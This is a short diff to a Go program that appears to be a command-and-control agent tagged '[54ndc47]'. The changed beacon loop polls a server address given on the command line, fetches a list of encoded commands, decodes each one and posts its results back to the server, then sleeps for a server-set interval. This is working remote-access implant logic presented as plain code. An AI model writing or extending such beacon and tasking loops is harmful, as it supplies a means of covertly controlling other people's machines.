@@ -13,6 +13,7 @@ import (
 	"os/exec"
 	"encoding/base64"
 	"encoding/json"
+	"reflect"
 )
 
 func encode(b []byte) []byte {
@@ -88,8 +89,12 @@ func main() {
 		for {
 			fmt.Println("[54ndc47] beacon")
 			commands := getInstructions(os.Args[1], paw)
-			if commands["id"] != nil {
-				postResults(os.Args[1], paw, commands)
+			if len(commands["commands"].([]interface{})) > 0 {
+				cmds := reflect.ValueOf(commands["commands"])
+				for i := 0; i < cmds.Len(); i++ {
+					command := cmds.Index(i).Elem().String()
+					postResults(os.Args[1], paw, unpack([]byte(command)))
+				}
 			}
 			time.Sleep(time.Duration(commands["sleep"].(float64)) * time.Second)
 		}
